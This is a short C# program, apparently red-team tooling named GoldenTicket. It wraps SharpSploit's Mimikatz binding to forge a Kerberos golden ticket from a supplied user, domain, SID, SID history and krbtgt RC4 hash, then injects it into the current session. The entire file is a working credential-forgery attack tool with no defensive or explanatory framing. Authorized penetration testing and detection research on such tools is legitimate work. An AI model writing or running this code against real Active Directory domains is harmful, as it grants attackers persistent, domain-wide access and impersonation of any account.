using System;

using SharpSploit.Credentials;

namespace GoldenTicket
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 5)
            {
                Console.Error.WriteLine("Incorrect number of arguments");
                Console.Error.WriteLine("Usage: GoldenTicket.exe <User> <Domain> <SID> <SIDHistory> <RC4>");
                return;
            }
            try
            {
                var cmd = $"\"kerberos::golden /user:{args[0]} /domain:{args[1]} /sid:{args[2]} /sids:{args[3]} /krbtgt:{args[4]} /ptt\" \"exit\"";
                var mimi = Mimikatz.Command(cmd);
                Console.WriteLine(mimi);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}